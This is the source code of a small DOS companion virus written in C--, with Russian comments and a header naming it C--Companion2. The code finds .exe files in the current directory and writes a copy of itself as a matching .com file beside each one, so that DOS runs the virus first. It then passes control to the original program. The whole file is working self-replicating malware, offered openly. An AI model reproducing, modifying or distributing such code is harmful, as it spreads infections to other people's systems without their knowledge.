/* Немного соптимизированный comp1.c--
   Как это ни странно - обьявил я DTA как структуру,и вирус стал на 6
   байт меньше занимать...
Name:	C--Companion2
Type:	Trivial.Companion
Size:	409
*/

?alignword		0
?argc			1
?define	vlen	409

?include "DOS.H--"

byte	msk  = "*.exe";
byte	comh = "exe";
byte	exch = "com";
byte	tst[128];

struct	filerec {
byte	stuff[21];		/* Какая-то фигня */
byte	fattr;			/* Аттрибуты файла */
word	ftime;			/* Время */
word	fdate;			/* Дата */
dword	fsize;			/* размер */
byte	fname[13];		/* Имя */
} dta;

main()
{
 setDTA(SS,#dta);			/* Установим DTA */
 if (@FINDFIRSTFILE(,,0,#msk) == 0)	/* Ищем первый файл */
  do
  {
   SI = #dta.fname;			/* SI указывает на имя */
   while (char DSBYTE[SI] != '.') SI++;	/* Ищем точку */
   STRNCPY(SI+1,#exch,3);		/* меняем расширение на .com */
   BX = FOPEN(0,,,#dta+0x1E);		/* пробуем открыть */
   if (AX == 0)				/* открылся ? */
    {
     BX = FCREATE(,,0,#dta.fname);	/* Нет. Создаем оный */
     @FWRITE(,BX,vlen,0x100);		/* Пишимся */
    }
  @FCLOSE(,BX);				/* Закрываем */
  } while (@FINDNEXTFILE() == 0);	/* Ищем следующий */
 STRCPY(,,,,#tst,PARAMSTR(0));		/* Копируем наше имя в массив */
 SI = #tst;				/* SI туда указывает */
 while (char SSBYTE[SI] != '.') SI++;	/* Ищем '.' */
 STRNCPY(SI+1,#comh,3);			/* Меняем расширение на .exe */
 spawn(#tst,0x80,0);			/* Запускаем */
}